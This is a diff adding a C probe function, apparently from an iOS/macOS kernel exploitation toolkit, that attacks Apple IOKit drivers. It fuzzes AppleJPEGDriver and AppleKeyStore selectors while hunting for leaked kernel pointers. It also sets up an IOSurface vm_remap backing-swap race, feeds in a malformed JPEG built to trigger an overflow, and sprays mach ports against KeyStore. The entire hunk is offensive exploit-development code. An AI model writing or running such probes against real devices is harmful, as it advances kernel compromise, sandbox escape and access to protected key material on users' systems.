@@ -4975,6 +4975,665 @@ static void r313_probe(void) {
     fflush(stdout);
 }
 
+static void r318_probe(void) {
+    rlog("\n=== r318: JPEG Hardware Decode + IOSurface Swap Race ===\n");
+    rlog("  Strategy: PSP TIFF exploit (malformed image) + swap-sploit (backing swap)\n\n");
+    fflush(stdout);
+    kern_return_t kr;
+
+    /* ---- Part 1: AppleJPEGDriver struct methods with JPEG data ---- */
+    rlog("--- Part 1: AppleJPEGDriver struct input scan ---\n");
+    fflush(stdout);
+
+    io_service_t jpeg_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+        IOServiceMatching("AppleJPEGDriver"));
+    if (jpeg_svc) {
+        /* Enumerate properties first */
+        CFMutableDictionaryRef jp = NULL;
+        kr = IORegistryEntryCreateCFProperties(jpeg_svc, &jp, kCFAllocatorDefault, 0);
+        if (kr == 0 && jp) {
+            CFIndex cnt = CFDictionaryGetCount(jp);
+            rlog("  AppleJPEGDriver props: %ld keys\n", (long)cnt);
+            CFStringRef *keys = (CFStringRef *)malloc(cnt * sizeof(CFStringRef));
+            CFDictionaryGetKeysAndValues(jp, (const void **)keys, NULL);
+            for (CFIndex i = 0; i < cnt && i < 30; i++) {
+                char kbuf[128];
+                CFStringGetCString(keys[i], kbuf, sizeof(kbuf), kCFStringEncodingUTF8);
+                rlog("    %s\n", kbuf);
+            }
+            free(keys);
+            CFRelease(jp);
+        }
+
+        /* Try struct methods with minimal JPEG header as input */
+        uint8_t jpeg_hdr[] = {
+            0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46,
+            0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01,
+            0x00, 0x01, 0x00, 0x00, 0xFF, 0xDB, 0x00, 0x43,
+            0x00, 0x08, 0x06, 0x06, 0x07, 0x06, 0x05, 0x08,
+            0xFF, 0xD9
+        };
+
+        for (uint32_t type = 0; type < 3; type++) {
+            io_connect_t c = 0;
+            kr = IOServiceOpen(jpeg_svc, mach_task_self(), type, &c);
+            if (kr != 0 || !c) continue;
+            rlog("  type=%u conn=0x%x\n", type, c);
+
+            for (uint32_t sel = 0; sel < 20; sel++) {
+                /* Try struct with JPEG data */
+                char out[512] = {0};
+                size_t outSz = sizeof(out);
+                kr = IOConnectCallStructMethod(c, sel, jpeg_hdr, sizeof(jpeg_hdr), out, &outSz);
+                if (kr != 0xe00002bc && kr != 0xe00002c2) {
+                    rlog("    sel[%u](jpeg): kr=0x%x outSz=%zu\n", sel, kr, outSz);
+                    if (outSz >= 8) {
+                        uint64_t *p = (uint64_t *)out;
+                        for (size_t j = 0; j < outSz / 8 && j < 4; j++) {
+                            if (p[j] != 0) rlog("      out[%zu]=0x%llx\n", j, p[j]);
+                            if (p[j] > 0xffff000000000000ULL)
+                                rlog("      !!! KPTR: 0x%llx !!!\n", p[j]);
+                        }
+                    }
+                }
+
+                /* Try with IOSurface ID as struct input (4 bytes) */
+                uint32_t sid = 1;
+                outSz = sizeof(out);
+                kr = IOConnectCallStructMethod(c, sel, &sid, 4, out, &outSz);
+                if (kr != 0xe00002bc && kr != 0xe00002c2 && kr != 0xe00002bd) {
+                    rlog("    sel[%u](sid=1): kr=0x%x outSz=%zu\n", sel, kr, outSz);
+                }
+
+                /* Try method with both scalar + struct (mixed) */
+                uint64_t scIn[2] = {0, 0};
+                uint64_t scOut[4] = {0};
+                uint32_t scOutCnt = 4;
+                outSz = sizeof(out);
+                kr = IOConnectCallMethod(c, sel, scIn, 2, jpeg_hdr, sizeof(jpeg_hdr),
+                                        scOut, &scOutCnt, out, &outSz);
+                if (kr != 0xe00002bc && kr != 0xe00002c2 && kr != 0xe00002bd) {
+                    rlog("    sel[%u](mixed): kr=0x%x scOut=[0x%llx] structSz=%zu\n",
+                         sel, kr, scOut[0], outSz);
+                }
+            }
+            IOServiceClose(c);
+        }
+        IOObjectRelease(jpeg_svc);
+    } else {
+        rlog("  AppleJPEGDriver: not found\n");
+    }
+    fflush(stdout);
+
+    /* ---- Part 2: IOSurface create + backing memory setup ---- */
+    rlog("\n--- Part 2: IOSurface create with proper dict ---\n");
+    fflush(stdout);
+
+    io_service_t is_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+        IOServiceMatching("IOSurfaceRoot"));
+    io_connect_t is_conn = 0;
+    uint32_t surfID = 0;
+    if (is_svc) {
+        kr = IOServiceOpen(is_svc, mach_task_self(), 0, &is_conn);
+        IOObjectRelease(is_svc);
+        rlog("  IOSurfaceRoot: conn=0x%x kr=0x%x\n", is_conn, kr);
+    }
+
+    if (is_conn) {
+        /* Use IOSurfaceCreate from framework instead of raw IOKit */
+        void *ios_fw = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
+        rlog("  IOSurface.framework: %p\n", ios_fw);
+
+        typedef void* (*IOSurfaceCreate_t)(CFDictionaryRef);
+        typedef uint32_t (*IOSurfaceGetID_t)(void*);
+        typedef void* (*IOSurfaceGetBaseAddress_t)(void*);
+        typedef size_t (*IOSurfaceGetAllocSize_t)(void*);
+        typedef uint32_t (*IOSurfaceLock_t)(void*, uint32_t, uint32_t*);
+        typedef uint32_t (*IOSurfaceUnlock_t)(void*, uint32_t, uint32_t*);
+
+        IOSurfaceCreate_t surfCreate = (IOSurfaceCreate_t)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+        IOSurfaceGetID_t surfGetID = (IOSurfaceGetID_t)dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
+        IOSurfaceGetBaseAddress_t surfGetBase = (IOSurfaceGetBaseAddress_t)dlsym(RTLD_DEFAULT, "IOSurfaceGetBaseAddress");
+        IOSurfaceGetAllocSize_t surfGetSize = (IOSurfaceGetAllocSize_t)dlsym(RTLD_DEFAULT, "IOSurfaceGetAllocSize");
+        IOSurfaceLock_t surfLock = (IOSurfaceLock_t)dlsym(RTLD_DEFAULT, "IOSurfaceLock");
+        IOSurfaceUnlock_t surfUnlock = (IOSurfaceUnlock_t)dlsym(RTLD_DEFAULT, "IOSurfaceUnlock");
+
+        rlog("  IOSurfaceCreate: %p GetID: %p GetBase: %p\n", surfCreate, surfGetID, surfGetBase);
+
+        if (surfCreate) {
+            CFStringRef wKey = CFSTR("IOSurfaceWidth");
+            CFStringRef hKey = CFSTR("IOSurfaceHeight");
+            CFStringRef bpeKey = CFSTR("IOSurfaceBytesPerElement");
+            CFStringRef pfKey = CFSTR("IOSurfacePixelFormat");
+
+            int w = 64, h = 64, bpe = 4;
+            int pf = 0x42475241; /* 'BGRA' */
+            CFNumberRef wVal = CFNumberCreate(NULL, kCFNumberIntType, &w);
+            CFNumberRef hVal = CFNumberCreate(NULL, kCFNumberIntType, &h);
+            CFNumberRef bpeVal = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+            CFNumberRef pfVal = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+
+            CFStringRef dictKeys[] = {wKey, hKey, bpeKey, pfKey};
+            CFTypeRef dictVals[] = {wVal, hVal, bpeVal, pfVal};
+            CFDictionaryRef props = CFDictionaryCreate(NULL,
+                (const void **)dictKeys, (const void **)dictVals, 4,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+
+            void *surf = surfCreate(props);
+            rlog("  Surface: %p\n", surf);
+
+            if (surf) {
+                surfID = surfGetID(surf);
+                size_t allocSz = surfGetSize(surf);
+                rlog("  surfID=%u allocSize=%zu\n", surfID, allocSz);
+
+                /* Lock and get base address */
+                surfLock(surf, 0x00000003, NULL); /* kIOSurfaceLockReadWrite */
+                void *base = surfGetBase(surf);
+                rlog("  base=%p\n", base);
+
+                if (base) {
+                    /* Fill with pattern */
+                    memset(base, 0x41, allocSz > 4096 ? 4096 : allocSz);
+
+                    /* Write a minimal JPEG at the start of the surface */
+                    if (allocSz >= sizeof(jpeg_hdr)) {
+                        memcpy(base, jpeg_hdr, sizeof(jpeg_hdr));
+                    }
+                    rlog("  Wrote JPEG header to surface base\n");
+
+                    /* Check if any kernel pointers leaked into surface metadata */
+                    uint64_t *p64 = (uint64_t *)base;
+                    rlog("  Surface data[0..3]: 0x%llx 0x%llx 0x%llx 0x%llx\n",
+                         p64[0], p64[1], p64[2], p64[3]);
+                }
+                surfUnlock(surf, 0x00000003, NULL);
+            }
+
+            CFRelease(props);
+            CFRelease(wVal); CFRelease(hVal); CFRelease(bpeVal); CFRelease(pfVal);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 3: IOSurface + JPEG combined — feed surface to JPEG driver ---- */
+    rlog("\n--- Part 3: Feed IOSurface to JPEG driver ---\n");
+    fflush(stdout);
+
+    if (surfID > 0) {
+        jpeg_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+            IOServiceMatching("AppleJPEGDriver"));
+        if (jpeg_svc) {
+            io_connect_t jc = 0;
+            kr = IOServiceOpen(jpeg_svc, mach_task_self(), 0, &jc);
+            if (kr == 0 && jc) {
+                rlog("  JPEG conn=0x%x surfID=%u\n", jc, surfID);
+
+                /* Try selectors with surfaceID as input */
+                for (uint32_t sel = 0; sel < 10; sel++) {
+                    uint64_t scIn[4] = {surfID, 0, 64, 64};
+                    uint64_t scOut[8] = {0};
+                    uint32_t scOutCnt = 8;
+                    char sOut[1024] = {0};
+                    size_t sOutSz = sizeof(sOut);
+
+                    kr = IOConnectCallMethod(jc, sel, scIn, 4, NULL, 0,
+                                            scOut, &scOutCnt, sOut, &sOutSz);
+                    if (kr != 0xe00002bc && kr != 0xe00002c2) {
+                        rlog("    sel[%u](surfID): kr=0x%x scOut=[0x%llx,0x%llx]\n",
+                             sel, kr, scOut[0], scOut[1]);
+                    }
+
+                    /* Struct with surface ID + dimensions */
+                    struct { uint32_t sid; uint32_t w; uint32_t h; uint32_t fmt; } jpegReq = {
+                        surfID, 64, 64, 0x42475241
+                    };
+                    sOutSz = sizeof(sOut);
+                    kr = IOConnectCallStructMethod(jc, sel, &jpegReq, sizeof(jpegReq), sOut, &sOutSz);
+                    if (kr != 0xe00002bc && kr != 0xe00002c2 && kr != 0xe00002bd) {
+                        rlog("    sel[%u](struct+sid): kr=0x%x outSz=%zu\n", sel, kr, sOutSz);
+                        if (sOutSz >= 8) {
+                            uint64_t *op = (uint64_t *)sOut;
+                            for (size_t j = 0; j < sOutSz / 8 && j < 4; j++) {
+                                if (op[j] != 0) rlog("      out[%zu]=0x%llx\n", j, op[j]);
+                                if (op[j] > 0xffff000000000000ULL)
+                                    rlog("      !!! KPTR: 0x%llx !!!\n", op[j]);
+                            }
+                        }
+                    }
+                }
+                IOServiceClose(jc);
+            }
+            IOObjectRelease(jpeg_svc);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 4: KeyStore with crafted inputs ---- */
+    rlog("\n--- Part 4: KeyStore with crafted inputs ---\n");
+    fflush(stdout);
+
+    io_service_t ks_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+        IOServiceMatching("AppleKeyStore"));
+    if (ks_svc) {
+        io_connect_t kc = 0;
+        kr = IOServiceOpen(ks_svc, mach_task_self(), 0, &kc);
+        if (kr == 0 && kc) {
+            rlog("  KeyStore conn=0x%x\n", kc);
+
+            /* sel 0 with varying input counts */
+            for (uint32_t inCnt = 1; inCnt <= 6; inCnt++) {
+                uint64_t scIn[8] = {0, 1, 2, 3, 4, 5, 6, 7};
+                uint64_t scOut[8] = {0};
+                uint32_t scOutCnt = 8;
+                kr = IOConnectCallScalarMethod(kc, 0, scIn, inCnt, scOut, &scOutCnt);
+                if (kr == 0 && (scOut[0] || scOut[1])) {
+                    rlog("    sel0(in=%u): out=[0x%llx,0x%llx,0x%llx]\n",
+                         inCnt, scOut[0], scOut[1], scOut[2]);
+                }
+            }
+
+            /* sel 1 with struct input — key bag request */
+            uint8_t keybagReq[64] = {0};
+            keybagReq[0] = 0x01; /* version? */
+            keybagReq[4] = 0x01; /* key class? */
+            char ksOut[512] = {0};
+            size_t ksOutSz = sizeof(ksOut);
+            kr = IOConnectCallStructMethod(kc, 1, keybagReq, 64, ksOut, &ksOutSz);
+            rlog("    sel1(keybag): kr=0x%x outSz=%zu\n", kr, ksOutSz);
+            if (kr == 0 && ksOutSz > 0) {
+                uint64_t *op = (uint64_t *)ksOut;
+                for (size_t j = 0; j < ksOutSz / 8 && j < 8; j++) {
+                    if (op[j] != 0) {
+                        rlog("      out[%zu]=0x%llx\n", j, op[j]);
+                        if (op[j] > 0xffff000000000000ULL)
+                            rlog("      !!! KPTR: 0x%llx !!!\n", op[j]);
+                    }
+                }
+            }
+
+            /* sel 16 — with surface ID as input */
+            {
+                uint64_t scIn[4] = {surfID, 0, 0, 0};
+                uint64_t scOut[8] = {0};
+                uint32_t scOutCnt = 8;
+                kr = IOConnectCallScalarMethod(kc, 16, scIn, 1, scOut, &scOutCnt);
+                rlog("    sel16(surfID=%u): kr=0x%x out=[0x%llx,0x%llx]\n",
+                     surfID, kr, scOut[0], scOut[1]);
+            }
+
+            /* sel 0 + sel 1 combined — first query, then read */
+            for (int trial = 0; trial < 5; trial++) {
+                uint64_t scIn0[2] = {(uint64_t)trial, 0};
+                uint64_t scOut0[8] = {0};
+                uint32_t cnt0 = 8;
+                IOConnectCallScalarMethod(kc, 0, scIn0, 2, scOut0, &cnt0);
+
+                uint64_t scIn1[2] = {scOut0[0], (uint64_t)trial};
+                uint64_t scOut1[8] = {0};
+                uint32_t cnt1 = 8;
+                kr = IOConnectCallScalarMethod(kc, 1, scIn1, 2, scOut1, &cnt1);
+                if (kr == 0 && scOut1[0]) {
+                    rlog("    sel0→sel1[%d]: out=[0x%llx,0x%llx]\n",
+                         trial, scOut1[0], scOut1[1]);
+                }
+            }
+
+            IOServiceClose(kc);
+        }
+        IOObjectRelease(ks_svc);
+    }
+    fflush(stdout);
+
+    /* ---- Part 5: IOSurface vm_remap race with JPEG ---- */
+    rlog("\n--- Part 5: IOSurface backing swap race ---\n");
+    fflush(stdout);
+
+    if (surfID > 0) {
+        /* Lookup surface by ID */
+        typedef void* (*IOSurfaceLookup_t)(uint32_t);
+        IOSurfaceLookup_t surfLookup = (IOSurfaceLookup_t)dlsym(RTLD_DEFAULT, "IOSurfaceLookup");
+        typedef void* (*IOSurfaceGetBaseAddress_t2)(void*);
+        IOSurfaceGetBaseAddress_t2 surfGetBase2 = (IOSurfaceGetBaseAddress_t2)dlsym(RTLD_DEFAULT, "IOSurfaceGetBaseAddress");
+        typedef uint32_t (*IOSurfaceLock_t2)(void*, uint32_t, uint32_t*);
+        IOSurfaceLock_t2 surfLock2 = (IOSurfaceLock_t2)dlsym(RTLD_DEFAULT, "IOSurfaceLock");
+        typedef uint32_t (*IOSurfaceUnlock_t2)(void*, uint32_t, uint32_t*);
+        IOSurfaceUnlock_t2 surfUnlock2 = (IOSurfaceUnlock_t2)dlsym(RTLD_DEFAULT, "IOSurfaceUnlock");
+
+        if (surfLookup) {
+            void *surf2 = surfLookup(surfID);
+            rlog("  IOSurfaceLookup(%u): %p\n", surfID, surf2);
+
+            if (surf2) {
+                surfLock2(surf2, 3, NULL);
+                void *base2 = surfGetBase2(surf2);
+                rlog("  Looked-up base: %p\n", base2);
+
+                /* vm_remap the surface memory to a new region */
+                mach_vm_address_t remap_addr = 0;
+                mach_vm_size_t remap_sz = 0x4000;
+                vm_prot_t cur_prot, max_prot;
+
+                if (base2) {
+                    kr = mach_vm_remap(mach_task_self(), &remap_addr, remap_sz, 0,
+                        VM_FLAGS_ANYWHERE, mach_task_self(), (mach_vm_address_t)base2,
+                        0, &cur_prot, &max_prot, VM_INHERIT_NONE);
+                    rlog("  vm_remap: kr=0x%x addr=0x%llx prot=%d/%d\n",
+                         kr, remap_addr, cur_prot, max_prot);
+
+                    if (kr == 0) {
+                        /* Verify shared: write through remap, check original */
+                        *(uint64_t *)remap_addr = 0xDEADBEEFCAFEBABEULL;
+                        uint64_t check = *(uint64_t *)base2;
+                        rlog("  Shared verify: wrote 0xDEADBEEFCAFEBABE, read back 0x%llx %s\n",
+                             check, check == 0xDEADBEEFCAFEBABEULL ? "SHARED!" : "NOT SHARED");
+
+                        /* Now: write malformed JPEG to remap region */
+                        uint8_t bad_jpeg[] = {
+                            0xFF, 0xD8, 0xFF, 0xE0, 0xFF, 0xFF, /* oversized APP0 marker */
+                            0x4A, 0x46, 0x49, 0x46, 0x00, 0x01,
+                            0xFF, 0xC0, 0x00, 0x11, 0x08,       /* SOF marker */
+                            0xFF, 0xFF, /* height = 65535 */
+                            0xFF, 0xFF, /* width = 65535 */
+                            0x03,       /* 3 components */
+                            0x01, 0x22, 0x00,
+                            0x02, 0x11, 0x01,
+                            0x03, 0x11, 0x01,
+                            0xFF, 0xDA, /* SOS */
+                            0x00, 0x0C, 0x03, 0x01, 0x00, 0x02, 0x11, 0x03,
+                            0x11, 0x00, 0x3F, 0x00,
+                            /* Garbage payload to trigger overflow */
+                        };
+                        memcpy((void *)remap_addr, bad_jpeg, sizeof(bad_jpeg));
+
+                        /* Flood remainder with 0x41414141 pattern */
+                        for (size_t off = sizeof(bad_jpeg); off < 4096; off += 4) {
+                            *(uint32_t *)((uint8_t *)remap_addr + off) = 0x41414141;
+                        }
+
+                        rlog("  Wrote malformed JPEG (%zu bytes) to remapped surface\n",
+                             sizeof(bad_jpeg));
+
+                        /* Now scan ALL vm regions for any leaked kernel addresses
+                           that might have appeared from the hardware decoder touching
+                           the surface data */
+                        mach_vm_address_t scan = 0;
+                        mach_vm_size_t scan_sz = 0;
+                        vm_region_basic_info_data_64_t info;
+                        mach_msg_type_number_t infoCnt = VM_REGION_BASIC_INFO_COUNT_64;
+                        mach_port_t obj;
+                        int found_regions = 0;
+                        int kptr_count = 0;
+
+                        while (found_regions < 20) {
+                            infoCnt = VM_REGION_BASIC_INFO_COUNT_64;
+                            kr = mach_vm_region(mach_task_self(), &scan, &scan_sz,
+                                VM_REGION_BASIC_INFO_64, (vm_region_info_t)&info, &infoCnt, &obj);
+                            if (kr != 0) break;
+
+                            /* Check writable regions near our surface */
+                            if (info.protection & VM_PROT_READ && scan_sz <= 0x100000) {
+                                uint64_t *p = (uint64_t *)scan;
+                                size_t check_words = scan_sz / 8;
+                                if (check_words > 512) check_words = 512;
+                                for (size_t w = 0; w < check_words; w++) {
+                                    uint64_t val = 0;
+                                    /* Safe read with mach_vm_read_overwrite */
+                                    mach_vm_size_t rd = 0;
+                                    kern_return_t rr = mach_vm_read_overwrite(mach_task_self(),
+                                        scan + w * 8, 8, (mach_vm_address_t)&val, &rd);
+                                    if (rr != 0) break;
+                                    if ((val >> 40) == 0xffffff || (val >> 40) == 0xffff00) {
+                                        rlog("    !!! KPTR at 0x%llx+0x%zx: 0x%llx !!!\n",
+                                             (uint64_t)scan, w * 8, val);
+                                        kptr_count++;
+                                        if (kptr_count >= 5) break;
+                                    }
+                                }
+                            }
+                            found_regions++;
+                            scan += scan_sz;
+                        }
+                        rlog("  Scanned %d regions, found %d potential kptrs\n",
+                             found_regions, kptr_count);
+
+                        mach_vm_deallocate(mach_task_self(), remap_addr, remap_sz);
+                    }
+                }
+                surfUnlock2(surf2, 3, NULL);
+            }
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 6: Mach port notification spray + KeyStore ---- */
+    rlog("\n--- Part 6: Mach port spray + KeyStore race ---\n");
+    fflush(stdout);
+
+    {
+        mach_port_t ports[256];
+        int created = 0;
+        for (int i = 0; i < 256; i++) {
+            kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
+            if (kr == 0) {
+                mach_port_insert_right(mach_task_self(), ports[i], ports[i], MACH_MSG_TYPE_MAKE_SEND);
+                created++;
+            }
+        }
+        rlog("  Created %d mach ports\n", created);
+
+        /* Open KeyStore and spray operations while port notifications are pending */
+        io_service_t ks2 = IOServiceGetMatchingService(kIOMasterPortDefault,
+            IOServiceMatching("AppleKeyStore"));
+        if (ks2) {
+            io_connect_t kc2 = 0;
+            IOServiceOpen(ks2, mach_task_self(), 0, &kc2);
+            if (kc2) {
+                /* Rapid fire sel 0 + notification port registration */
+                for (int spray = 0; spray < 100; spray++) {
+                    uint64_t scIn[2] = {(uint64_t)spray, (uint64_t)ports[spray % 256]};
+                    uint64_t scOut[8] = {0};
+                    uint32_t scOutCnt = 8;
+                    kr = IOConnectCallScalarMethod(kc2, 0, scIn, 2, scOut, &scOutCnt);
+                    if (scOut[0] != 0 || scOut[1] != 0) {
+                        rlog("    spray[%d]: out=[0x%llx,0x%llx]\n", spray, scOut[0], scOut[1]);
+                        if (scOut[0] > 0xffff000000000000ULL)
+                            rlog("      !!! KPTR: 0x%llx !!!\n", scOut[0]);
+                    }
+                }
+                IOServiceClose(kc2);
+            }
+            IOObjectRelease(ks2);
+        }
+
+        for (int i = 0; i < 256; i++) {
+            mach_port_deallocate(mach_task_self(), ports[i]);
+            mach_port_mod_refs(mach_task_self(), ports[i], MACH_PORT_RIGHT_RECEIVE, -1);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 7: Proper JPEG decode via documented struct API ---- */
+    rlog("\n--- Part 7: JPEG decode with JPEGDriverArgs ---\n");
+    fflush(stdout);
+
+    {
+        typedef void* (*IOSurfaceCreate_t)(CFDictionaryRef);
+        typedef uint32_t (*IOSurfaceGetID_t)(void*);
+        typedef void* (*IOSurfaceGetBaseAddress_t)(void*);
+        typedef size_t (*IOSurfaceGetAllocSize_t)(void*);
+        typedef uint32_t (*IOSurfaceLock_t)(void*, uint32_t, uint32_t*);
+        typedef uint32_t (*IOSurfaceUnlock_t)(void*, uint32_t, uint32_t*);
+
+        IOSurfaceCreate_t surfCreate = (IOSurfaceCreate_t)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+        IOSurfaceGetID_t surfGetID = (IOSurfaceGetID_t)dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
+        IOSurfaceGetBaseAddress_t surfGetBase = (IOSurfaceGetBaseAddress_t)dlsym(RTLD_DEFAULT, "IOSurfaceGetBaseAddress");
+        IOSurfaceGetAllocSize_t surfGetSize = (IOSurfaceGetAllocSize_t)dlsym(RTLD_DEFAULT, "IOSurfaceGetAllocSize");
+        IOSurfaceLock_t surfLock = (IOSurfaceLock_t)dlsym(RTLD_DEFAULT, "IOSurfaceLock");
+        IOSurfaceUnlock_t surfUnlock = (IOSurfaceUnlock_t)dlsym(RTLD_DEFAULT, "IOSurfaceUnlock");
+
+        if (!surfCreate) {
+            rlog("  IOSurfaceCreate not found\n");
+            goto skip_part7;
+        }
+
+        /* Create source surface (JPEG data) */
+        int sw = 256, sh = 256, sbpe = 1;
+        CFNumberRef swV = CFNumberCreate(NULL, kCFNumberIntType, &sw);
+        CFNumberRef shV = CFNumberCreate(NULL, kCFNumberIntType, &sh);
+        CFNumberRef sbV = CFNumberCreate(NULL, kCFNumberIntType, &sbpe);
+        CFStringRef dk[] = {CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"), CFSTR("IOSurfaceBytesPerElement")};
+        CFTypeRef dv[] = {swV, shV, sbV};
+        CFDictionaryRef srcProps = CFDictionaryCreate(NULL, (const void **)dk, (const void **)dv, 3,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        void *srcSurf = surfCreate(srcProps);
+        CFRelease(srcProps); CFRelease(swV); CFRelease(shV); CFRelease(sbV);
+
+        /* Create destination surface (decoded BGRA) */
+        int dw = 256, dh = 256, dbpe = 4, dpf = 0x42475241;
+        CFNumberRef dwV = CFNumberCreate(NULL, kCFNumberIntType, &dw);
+        CFNumberRef dhV = CFNumberCreate(NULL, kCFNumberIntType, &dh);
+        CFNumberRef dbV = CFNumberCreate(NULL, kCFNumberIntType, &dbpe);
+        CFNumberRef dpV = CFNumberCreate(NULL, kCFNumberIntType, &dpf);
+        CFStringRef dk2[] = {CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
+                             CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat")};
+        CFTypeRef dv2[] = {dwV, dhV, dbV, dpV};
+        CFDictionaryRef dstProps = CFDictionaryCreate(NULL, (const void **)dk2, (const void **)dv2, 4,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        void *dstSurf = surfCreate(dstProps);
+        CFRelease(dstProps); CFRelease(dwV); CFRelease(dhV); CFRelease(dbV); CFRelease(dpV);
+
+        if (!srcSurf || !dstSurf) {
+            rlog("  Surface creation failed: src=%p dst=%p\n", srcSurf, dstSurf);
+            goto skip_part7;
+        }
+
+        uint32_t srcID = surfGetID(srcSurf);
+        uint32_t dstID = surfGetID(dstSurf);
+        rlog("  srcSurf=%p id=%u  dstSurf=%p id=%u\n", srcSurf, srcID, dstSurf, dstID);
+
+        /* Write a minimal valid JPEG to src surface */
+        surfLock(srcSurf, 3, NULL);
+        void *srcBase = surfGetBase(srcSurf);
+        size_t srcAllocSz = surfGetSize(srcSurf);
+        rlog("  srcBase=%p srcAllocSz=%zu\n", srcBase, srcAllocSz);
+
+        if (srcBase && srcAllocSz >= 64) {
+            /* Minimal JPEG: SOI + APP0 + DQT + SOF0 + SOS + EOI */
+            uint8_t mini_jpeg[] = {
+                0xFF, 0xD8,                     /* SOI */
+                0xFF, 0xE0, 0x00, 0x10,         /* APP0 marker, length=16 */
+                0x4A, 0x46, 0x49, 0x46, 0x00,   /* "JFIF\0" */
+                0x01, 0x01, 0x00,               /* version 1.1, no units */
+                0x00, 0x01, 0x00, 0x01, 0x00, 0x00, /* density */
+                0xFF, 0xD9                       /* EOI */
+            };
+            memset(srcBase, 0, srcAllocSz > 4096 ? 4096 : srcAllocSz);
+            memcpy(srcBase, mini_jpeg, sizeof(mini_jpeg));
+            rlog("  Wrote %zu-byte JPEG to src surface\n", sizeof(mini_jpeg));
+        }
+        surfUnlock(srcSurf, 3, NULL);
+
+        /* Open JPEG driver and try documented API */
+        io_service_t js = IOServiceGetMatchingService(kIOMasterPortDefault,
+            IOServiceMatching("AppleJPEGDriver"));
+        if (js) {
+            io_connect_t jconn = 0;
+            kr = IOServiceOpen(js, mach_task_self(), 0, &jconn);
+            rlog("  JPEG type=0 conn=0x%x kr=0x%x\n", jconn, kr);
+
+            if (kr == 0 && jconn) {
+                /* sel 0: initializeDecoder */
+                char iOut[128] = {0};
+                size_t iOutSz = sizeof(iOut);
+                kr = IOConnectCallStructMethod(jconn, 0, NULL, 0, iOut, &iOutSz);
+                rlog("  initializeDecoder: kr=0x%x outSz=%zu\n", kr, iOutSz);
+
+                /* sel 1: startDecoder with 40-byte JPEGDriverArgs */
+                struct JPEGDriverArgs40 {
+                    uint32_t src_surface_id;
+                    uint32_t dst_surface_id;
+                    uint32_t src_size;
+                    uint32_t dst_size;
+                    uint32_t width;
+                    uint32_t height;
+                    uint32_t quality;
+                    uint32_t flags;
+                    uint32_t reserved[2];
+                } args40 = {
+                    srcID, dstID, 22, 256*256*4, 256, 256, 4, 0, {0, 0}
+                };
+                char dOut[128] = {0};
+                size_t dOutSz = sizeof(dOut);
+                kr = IOConnectCallStructMethod(jconn, 1, &args40, 40, dOut, &dOutSz);
+                rlog("  startDecoder(40B): kr=0x%x outSz=%zu\n", kr, dOutSz);
+                if (kr == 0 && dOutSz > 0) {
+                    uint64_t *op = (uint64_t *)dOut;
+                    for (size_t j = 0; j < dOutSz / 8 && j < 8; j++) {
+                        rlog("    out[%zu]=0x%llx\n", j, op[j]);
+                        if (op[j] > 0xffff000000000000ULL)
+                            rlog("    !!! KPTR: 0x%llx !!!\n", op[j]);
+                    }
+                }
+
+                /* Try 88-byte variant (newer layout) */
+                uint8_t args88[88] = {0};
+                memcpy(args88, &args40, 40);
+                dOutSz = sizeof(dOut);
+                kr = IOConnectCallStructMethod(jconn, 1, args88, 88, dOut, &dOutSz);
+                rlog("  startDecoder(88B): kr=0x%x outSz=%zu\n", kr, dOutSz);
+                if (kr == 0 && dOutSz > 0) {
+                    uint64_t *op = (uint64_t *)dOut;
+                    for (size_t j = 0; j < dOutSz / 8 && j < 8; j++) {
+                        if (op[j] != 0) rlog("    out[%zu]=0x%llx\n", j, op[j]);
+                    }
+                }
+
+                /* sel 2: initializeEncoder */
+                iOutSz = sizeof(iOut);
+                kr = IOConnectCallStructMethod(jconn, 2, NULL, 0, iOut, &iOutSz);
+                rlog("  initializeEncoder: kr=0x%x outSz=%zu\n", kr, iOutSz);
+
+                /* sel 3: startEncoder */
+                struct JPEGDriverArgs40 eargs = {
+                    dstID, srcID, 256*256*4, 65536, 256, 256, 4, 0, {0, 0}
+                };
+                dOutSz = sizeof(dOut);
+                kr = IOConnectCallStructMethod(jconn, 3, &eargs, 40, dOut, &dOutSz);
+                rlog("  startEncoder(40B): kr=0x%x outSz=%zu\n", kr, dOutSz);
+
+                /* Check dst surface for any leaked data */
+                surfLock(dstSurf, 3, NULL);
+                void *dstBase = surfGetBase(dstSurf);
+                if (dstBase) {
+                    uint64_t *dp = (uint64_t *)dstBase;
+                    int non_zero = 0;
+                    for (int i = 0; i < 64; i++) {
+                        if (dp[i] != 0) {
+                            non_zero++;
+                            if (non_zero <= 4)
+                                rlog("  dst[%d]=0x%llx\n", i, dp[i]);
+                            if (dp[i] > 0xffff000000000000ULL)
+                                rlog("  !!! DST KPTR at [%d]: 0x%llx !!!\n", i, dp[i]);
+                        }
+                    }
+                    rlog("  dst surface non-zero qwords: %d\n", non_zero);
+                }
+                surfUnlock(dstSurf, 3, NULL);
+
+                IOServiceClose(jconn);
+            }
+            IOObjectRelease(js);
+        }
+
+        skip_part7: ;
+    }
+    fflush(stdout);
+
+    rlog("\n=== r318 complete ===\n");
+    fflush(stdout);
+}
+
 static void r317_probe(void) {
